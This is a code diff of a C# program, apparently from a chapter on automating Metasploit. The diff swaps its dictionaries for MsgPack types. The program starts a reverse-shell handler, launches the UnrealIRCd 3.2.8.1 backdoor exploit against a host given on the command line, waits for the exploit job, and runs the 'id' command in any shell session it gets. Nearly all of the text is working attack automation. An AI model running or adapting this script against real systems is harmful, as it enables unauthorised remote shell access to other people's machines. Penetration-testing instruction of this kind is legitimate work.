@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using MsgPack;
 
 namespace ch13_automating_metasploit
 {
@@ -15,9 +16,9 @@ namespace ch13_automating_metasploit
 				int listenPort = 4444;
 				string payload = "cmd/unix/reverse";
 				using (MetasploitManager manager = new MetasploitManager (session)) {
-					Dictionary<string, object> response = null;
+					MessagePackObjectDictionary response = null;
 
-					Dictionary<string, object> blah = new Dictionary<string, object> ();
+					MessagePackObjectDictionary blah = new MessagePackObjectDictionary ();
 					blah ["ExitOnSession"] = false;
 					blah ["PAYLOAD"] = payload;
 					blah ["LHOST"] = listenAddr;
@@ -26,7 +27,7 @@ namespace ch13_automating_metasploit
 					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
 					object jobID = response ["job_id"];
 
-					Dictionary<string, object> opts = new Dictionary<string, object> ();
+					MessagePackObjectDictionary opts = new MessagePackObjectDictionary ();
 					opts ["RHOST"] = args[0];
 					opts ["DisablePayloadHandler"] = true;
 					opts ["LHOST"] = listenAddr;
@@ -36,21 +37,19 @@ namespace ch13_automating_metasploit
 					manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
 
 					response = manager.ListJobs ();
-					List<object> vals = new List<object> (response.Values);
-					while (vals.Contains ((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
+					while (response.ContainsValue ("Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
 						Console.WriteLine ("Waiting");
 						System.Threading.Thread.Sleep (6000);
 						response = manager.ListJobs ();
-						vals = new List<object> (response.Values);
 					}
 
 					manager.StopJob (jobID.ToString ());
 
 					response = manager.ListSessions ();
 					foreach (var pair in response) {
-						string id = pair.Key;
-						Dictionary<string, object> dict = (Dictionary<string, object>)pair.Value;
-						if ((dict ["type"] as string) == "shell") {
+						string id = pair.Key.AsString();
+						MessagePackObjectDictionary dict = pair.Value.AsDictionary();
+						if (dict ["type"].AsString() == "shell") {
 							manager.WriteToSessionShell (id, "id\n");
 							System.Threading.Thread.Sleep (6000);
 							response = manager.ReadSessionShell (id);
